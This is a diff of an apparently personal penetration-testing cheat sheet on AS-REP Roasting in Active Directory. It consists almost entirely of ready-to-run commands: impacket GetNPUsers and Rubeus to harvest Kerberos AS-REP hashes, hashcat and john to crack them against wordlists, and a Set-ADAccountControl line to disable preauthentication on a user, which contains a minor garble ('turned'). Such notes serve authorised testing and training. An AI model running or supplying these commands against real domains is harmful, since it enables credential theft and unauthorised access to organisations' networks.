@@ -1,12 +1,26 @@
-#AS-REP Roasting
-#Users with preauth turn off
-impacket-GetNPUsers -dc-ip 192.168.50.70 -request   'domain.com/' -format hashcat
-sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+# check ASREPRoast for all domain users (credentials required)
+python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 
-.\Rubeus.exe asreproast /nowrap
+# check ASREPRoast for a list of users (no credentials required)
+python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+# check ASREPRoast for all users in current domain
+.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+#cracking
+hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
+john --wordlist=<passwords_file> <AS_REP_responses_file>
+
+-------------------------------------------------------------------------------------------------------------------------------
 
 #GenericWrite on User, allow to set UF_DONT_REQUIRE_PREAUTH
 Set-ADAccountControl -Identity user -DoesNotRequirePreAuth turned
+
+-------------------------------------------------------------------------------------------------------------------------------
 
 
 
